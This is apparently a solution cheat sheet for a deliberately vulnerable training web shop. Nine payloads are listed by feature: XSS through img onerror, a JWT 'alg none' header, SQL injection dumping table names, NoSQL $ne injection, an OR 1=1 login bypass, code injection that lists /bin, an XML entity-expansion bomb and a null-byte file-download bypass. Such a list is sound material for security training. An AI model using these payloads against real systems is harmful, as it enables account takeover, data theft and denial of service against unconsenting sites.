1. Search bar:

   `<img src='1' onerror='alert(1)'>`

2. Customer feedback:

    `<<script<>img</img> src='1' onerror='alert(1)'></img>`

3. Support chat:

    `{"typ":"JWT","alg":"none"}`

4. Product search (`/rest/products/search?q=`):

    URL encoded: `a')) UNION SELECT 1, tbl_name, "a", 1, 2, null, null, null, null FROM sqlite_master WHERE type="table" --`

5. Edit review `PATCH /rest/products/reviews`:

   `"id": {"$ne": "a"},`

6. Login form:

   Email: `' OR 1=1 --`

7. Profile:

   Username: `#{require('fs').readdirSync('/bin').join(',')}`

8. Complaint:

    Invoice file:
    ```
    <?xml version="1.0"?>
      <!DOCTYPE lolz [
       <!ENTITY lol "lol">
       <!ELEMENT lolz (#PCDATA)>
       <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      ]>
    <lolz>&lol1;</lolz>
    ```
   
9. FTP:

    `http://localhost:3000/ftp/coupons_2013.md.bak%2500.pdf`